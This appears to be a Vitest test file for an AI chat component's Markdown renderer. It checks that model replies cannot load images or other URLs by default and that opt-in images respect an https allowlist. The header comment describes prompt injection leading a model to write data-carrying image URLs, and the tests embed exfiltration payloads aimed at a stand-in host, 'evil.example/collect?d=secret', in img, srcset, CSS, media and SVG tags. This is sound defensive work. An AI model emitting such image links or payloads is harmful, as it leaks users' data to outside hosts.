import { afterEach, describe, expect, it } from 'vitest';
import { renderMarkdown } from '../src/markdown/markdown.ts';
import { cleanupAll, mount, until } from './helpers.ts';

/**
 * A reply is model output. If text planted in the data a model reads talks it
 * into writing an image whose URL carries data, the reader's browser sends that
 * data out the moment the reply renders — no click needed ("markdown image
 * exfiltration", OWASP LLM02/LLM05). Every way rendered HTML can fetch a URL by
 * itself must be closed unless the app opts in.
 */

/** Parse rendered HTML into a detached fragment for inspection. */
function dom(html: string): DocumentFragment {
  const t = document.createElement('template');
  t.innerHTML = html;
  return t.content;
}

const SECRET = 'https://evil.example/collect?d=secret';

describe('nothing in a reply fetches a URL by default', () => {
  it('turns a Markdown image into its alt text', () => {
    const f = dom(renderMarkdown(`Here: ![the chart](${SECRET}) done`));
    expect(f.querySelector('img')).toBeNull();
    expect(f.textContent).toContain('the chart');
    expect(f.textContent).not.toContain('evil.example');
  });

  it('removes a raw HTML <img>, even with srcset', () => {
    const f = dom(renderMarkdown(`<img src="${SECRET}" srcset="${SECRET} 2x" alt="x">`));
    expect(f.querySelector('img')).toBeNull();
    expect(f.querySelector('[srcset]')).toBeNull();
  });

  it('strips CSS that can load a URL: style attributes and <style> tags', () => {
    const f = dom(
      renderMarkdown(
        `<span style="background:url(${SECRET})">a</span>\n\n<style>@import url(${SECRET});</style>`,
      ),
    );
    expect(f.querySelector('[style]')).toBeNull();
    expect(f.querySelector('style')).toBeNull();
    expect(f.textContent).not.toContain('evil.example');
  });

  it('removes media and SVG images, video posters and image inputs', () => {
    const f = dom(
      renderMarkdown(
        `<video poster="${SECRET}"></video><audio src="${SECRET}"></audio>` +
          `<picture><source srcset="${SECRET}"></picture>` +
          `<svg><image href="${SECRET}"></image></svg><input type="image" src="${SECRET}">`,
      ),
    );
    for (const sel of ['video', 'audio', 'picture', 'source', 'image', 'input', '[poster]']) {
      expect(f.querySelector(sel), sel).toBeNull();
    }
  });

  it('keeps Markdown task-list checkboxes', () => {
    const f = dom(renderMarkdown('- [x] done\n- [ ] todo'));
    expect(f.querySelectorAll('input[type="checkbox"]').length).toBe(2);
  });

  it('gives every link rel="noopener noreferrer"', () => {
    const f = dom(renderMarkdown('[site](https://example.com) and <a href="https://x.example" target="_blank">x</a>'));
    const links = [...f.querySelectorAll('a')];
    expect(links.length).toBe(2);
    for (const a of links) expect(a.getAttribute('rel')).toBe('noopener noreferrer');
  });
});

describe('images when the app opts in', () => {
  it('loads https images without leaking the page address', () => {
    const f = dom(renderMarkdown('![cat](https://cdn.example.com/cat.png)', 'Copy', { allowImages: true, imageHosts: [] }));
    const img = f.querySelector('img');
    expect(img?.getAttribute('src')).toBe('https://cdn.example.com/cat.png');
    expect(img?.getAttribute('referrerpolicy')).toBe('no-referrer');
  });

  it('never loads a non-https image', () => {
    const f = dom(renderMarkdown('![x](http://cdn.example.com/a.png)', 'Copy', { allowImages: true, imageHosts: [] }));
    expect(f.querySelector('img')).toBeNull();
  });

  it('loads only from the allowlist when one is set', () => {
    const policy = { allowImages: true, imageHosts: ['https://cdn.example.com/'] };
    expect(dom(renderMarkdown('![a](https://cdn.example.com/a.png)', 'Copy', policy)).querySelector('img')).not.toBeNull();
    // A look-alike host that merely starts with the same letters is refused.
    expect(dom(renderMarkdown('![b](https://cdn.example.com.evil.example/b.png)', 'Copy', policy)).querySelector('img')).toBeNull();
    expect(dom(renderMarkdown(`![c](${SECRET})`, 'Copy', policy)).querySelector('img')).toBeNull();
  });
});

describe('the component', () => {
  afterEach(cleanupAll);

  const replyImages = async (el: HTMLElement & { messages: unknown[] }) => {
    el.messages = [{ id: 'a1', role: 'assistant', content: `![pic](https://cdn.example.com/p.png) ![bad](${SECRET})`, createdAt: 0 }];
    const root = el.shadowRoot!;
    await until(() => root.querySelector('.markdown'));
    return root.querySelectorAll('.markdown img');
  };

  it('renders no images by default', async () => {
    const el = mount() as unknown as HTMLElement & { messages: unknown[] };
    expect((await replyImages(el)).length).toBe(0);
  });

  it('renders allowlisted images with allow-images and image-hosts', async () => {
    const el = mount('<ai-chat allow-images image-hosts="https://cdn.example.com/"></ai-chat>') as unknown as HTMLElement & {
      messages: unknown[];
    };
    const imgs = await replyImages(el);
    expect(imgs.length).toBe(1);
    expect(imgs[0].getAttribute('src')).toBe('https://cdn.example.com/p.png');
  });
});
